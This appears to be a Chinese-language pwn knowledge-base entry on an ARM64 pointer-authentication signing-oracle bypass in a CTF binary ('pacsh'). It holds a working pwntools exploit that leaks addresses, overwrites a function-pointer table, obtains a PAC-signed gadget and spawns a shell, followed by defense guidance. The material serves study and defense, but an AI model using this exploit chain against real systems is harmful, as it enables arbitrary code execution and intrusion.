---
id: binary-pwn-arm64-pac-function-pointer-signing-oracle
title: ARM64 PAC 函数指针签名预言机：可写 BUILTINS + help 的 paciza 重签任意指针
type: scenario
domain: binary
path: binary/pwn
technique: arm64-pac-function-pointer-signing-oracle
aliases:
- PAC 绕过
- 指针认证签名预言机
- paciza autiza
- pacsh
- ARM64 函数指针劫持
- PAC signing oracle
- SCS 影子栈
tags:
- pwn
- arm64
- aarch64
- pac
- pointer-authentication
- scs
- function-pointer
- arbitrary-read-write
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: ARMv8.3+ PAC（原文示例为 qemu-aarch64/pacsh）
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:35:06+08:00'
  notes: 已对照原文源码与 EXP 核对；修正 SCS 对本链影响的表述；原文未展示最终 flag，PoC 未复跑。
---

## 一句话结论

ARM64 的 PAC 只保证“指针被正确签名”，不保证“签名的是谁”；当程序把可写函数指针表交给 `paciza` 逐个签名（如 `help` 打印 BUILTINS 表），攻击者可先用任意写把表中的指针改成 `ldr x0,[sp,#0x18]; ret` 等 gadget，再调用 `help` 让程序用 PAC 密钥为攻击者选定的 gadget 生成合法签名，最后把这个签名指针喂回 `autiza`，即可绕过 PAC 执行 gadget/ROP。

## 原理

- **PAC（Pointer Authentication）**：ARMv8.3+ 用密钥对指针的高位做 MAC，`PACIZA`/`PACIA` 等指令把签名写入指针高位；`AUTIZA`/`AUTIA` 在使用前验证签名，失败则把指针破坏成无效值。签名通常绑定地址、密钥和 modifier（上下文）。
- **PAC 的边界**：它防的是“指针被篡改后直接使用”，不防“程序自己为攻击者提供的值签名”。如果存在一个 `paciza` 调用路径，其输入来自可写内存（函数指针表、全局变量），那么攻击者只要先改内存，再触发签名，就能得到任意目标的合法签名指针。
- **题目结构**：`pacsh` 的 `help()` 遍历 `BUILTINS[4]`，对每个 `fptr` 执行 `paciza` 并打印；主循环读取一个指针，执行 `autiza` 后调用。`read64`/`write64` 通过 `scanf("%p")` 提供任意地址读写（同样经签名函数指针调用）。这给了攻击者“任意读写 + 签名预言机 + 认证调用入口”三件套。
- **利用链**：
  1. `help` 打印的签名指针低 48 位是原始地址；用 `addr & 0xffffffffffff` 去掉 PAC 位，得到 `help`/`read64`/`write64` 的真实地址，计算 PIE 基址。
  2. 用 `read64` 读 `system@got`，得到 libc 中 `system` 地址，计算 libc 基址。
  3. 在 libc 中找 `ldr x0, [sp, #0x18]; ret` 之类 gadget；用 `write64` 把 `BUILTINS[1].fptr`（`ls`）改成该 gadget。
  4. 调用 `help`，它会 `paciza` 这个被改过的 gadget 指针并打印；抓取签名后的 gadget 指针。
  5. 用 `read64` 读 `environ`，泄露栈地址；用 `write64` 把 `/bin/sh` 写到 BSS，把 BSS 地址写到 `[stack+0x18]`（gadget 的 `ldr x0` 槽），把 `system` 写到 `[stack+0x8]`（gadget 的 `ret` 返回地址）。
  6. 把签名 gadget 指针发给主循环；`autiza` 验证通过（因为确实是程序刚签的），调用 gadget：`x0 = [sp+0x18] = "/bin/sh"`，`ret` 到 `[sp+8] = system`，获得 shell。
- **为什么 PAC 没挡住**：签名密钥没有泄露，攻击者也不需要它；`help` 主动为攻击者控制的表项签名。PAC 的信任假设是“签名输入可信”，而这里输入来自可写 `.data`。`SCS` 保护返回地址，会拦下本链最后借 `ret` 跳到 `system` 的那一步；但函数指针签名预言机本身不依赖返回地址，目标未启用 SCS 时本链成立。
- **前提**：目标启用 PAC 且存在 `paciza` 路径；函数指针表或待签名指针可写；有任意读写/泄露或等价原语；签名后的指针能回传给 `autiza` 调用点。

## 触发条件

- ARM64（ARMv8.3+）环境，二进制/库使用 PAC（`paciza`/`autiza`、`PACIASP`/`RETAA` 等）。
- 程序存在“对可写内存中的指针执行 PAC 签名”的路径（打印、注册回调、初始化表等），且输入可被攻击者改写。
- 存在任意读/写、越界写、UAF 等原语，能改函数指针表并泄露 ELF/libc/栈地址。
- 存在将用户输入经 `autiza` 后调用的入口，或能重放签名指针。
- 目标未把签名与严格的 modifier/上下文绑定（本例 `paciza` 使用零 modifier/默认 key）。

## 利用步骤

1. 运行/连接程序，收集 `help` 打印的签名函数指针，按低 48 位还原真实地址，计算 PIE 基址。
2. 通过已签名的 `read64`/`write64` 函数指针访问任意地址；读 `system@got` 等 GOT 项泄露 libc。
3. 在 libc 中选一个能设置参数并返回的 gadget（如 `ldr x0, [sp, #0x18]; ret`），用任意写覆盖 `BUILTINS` 中某个函数指针。
4. 调用 `help` 触发 `paciza`，读取被覆盖项的签名值；这就是攻击者目标 gadget 的合法 PAC 指针。
5. 读 `environ` 泄露栈，布置 `/bin/sh`、gadget 参数槽和 `system` 返回地址。
6. 把签名 gadget 指针发给主循环，经 `autiza` 验证后调用，完成 ROP/命令执行。

## PoC

```python
from pwn import *

io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "./pacsh"])
# 或 io = remote(host, port)

def recv_signed(label):
    io.recvuntil(label)
    return int(io.recvline()[:-1], 16)

help_p = recv_signed(b"help: ")
read_p = recv_signed(b"read64: ")
write_p = recv_signed(b"write64: ")

def call(p):
    io.sendlineafter(b"pacsh> ", hex(p))

def read64(addr):
    call(read_p)
    io.sendlineafter(b"read64> ", hex(addr))
    return int(io.recvline()[:-1], 16)

def write64(addr, val):
    call(write_p)
    io.sendlineafter(b"write64> ", hex(addr) + b" " + hex(val))
```

关键步骤（地址按目标调整）：

```python
elf_base = (help_p & 0xffffffffffff) - 0xb7c
libc_base = read64(elf_base + elf.got["system"]) - libc.sym["system"]

gadget = libc_base + 0x69500          # ldr x0, [sp, #0x18]; ret
ls_ptr = elf_base + 0x12028           # BUILTINS[1].fptr
write64(ls_ptr, gadget)               # 改写 ls 指针

call(help_p)                          # help 对新指针做 paciza
io.recvuntil(b"ls: ")
signed_gadget = int(io.recvline()[:-1], 16)

stack = read64(libc_base + libc.sym["environ"]) - 0x1a8
bss = elf_base + 0x12050
write64(bss, u64(b"/bin/sh\x00"))
write64(stack + 0x18, bss)
write64(stack + 0x8, libc_base + libc.sym["system"])

io.sendline(hex(signed_gadget))       # autiza 验证通过 -> gadget -> system("/bin/sh")
io.interactive()
```

## 变体与关联

- 变体：签名预言机不一定是 `help`；任何对用户可控全局/结构体指针执行 `paciza`/`paciasp` 的代码都可利用（回调注册、虚表初始化、日志打印）。
- 变体：没有任意写时，若可重放已签名指针或修改 modifier 相同的指针，也可复用；PAC 位暴力取决于签名位数（通常 16 位以下）。
- 变体：有 `xpaci`/`autiza` gadget 时可直接剥离/伪造签名；SCS 会阻断本链最后 `ret` 到 `system` 的返回地址覆盖，但不会阻止签名预言机；需换用不经过返回地址的调用原语。
- 关联：[[ctf-pwn-negative-index-hidden-slot-encoded-fptr]]（编码函数指针）、[[ctf-pwn-gcc15-ubuntu2604-cet-no-libc-csu-adaptation]]（CET/IBT 下的 ROP 适配）、[[binary-pwn-stack-fake-rbp-check-seccomp-orw]]（用户态帧检查不是安全边界）。
- 边界：函数指针表只读/Full RELRO、`paciza` 输入不可写、签名与严格 modifier 绑定且攻击者不能复用、`autiza` 失败后安全退出、或没有任意读写/泄露时，本链失效或需另找原语。

## 检测与防御

- 不要对可写内存中的指针做 PAC 签名并暴露签名结果；签名输入必须来自只读、受完整性保护的常量/表项。
- 函数指针表放只读段（Full RELRO/RELRO），禁止用户改写；对 `autiza` 失败做安全处理（终止而非继续使用被破坏指针）。
- PAC modifier 绑定上下文（函数、对象、调用点），避免签名指针被跨上下文重放；启用 SCS 保护返回地址，但不要把它当作函数指针保护。
- 不向用户打印带 PAC 的指针（打印前 `xpaci`/掩码），减少泄露；限制任意读写原语（安全 `scanf`、边界检查）。
- 检测：同一进程内 `BUILTINS`/回调表被改写后立即调用 `paciza`；`autiza` 失败率异常；用户输入包含带高位签名的 64 位指针；ARM64 二进制出现 `PACIZA`/`AUTIZA` 与可写函数指针表组合。
- 响应：轮换 PAC 密钥（重新启动/更新固件），审计可写函数指针表与签名调用点，修复任意读写入口。
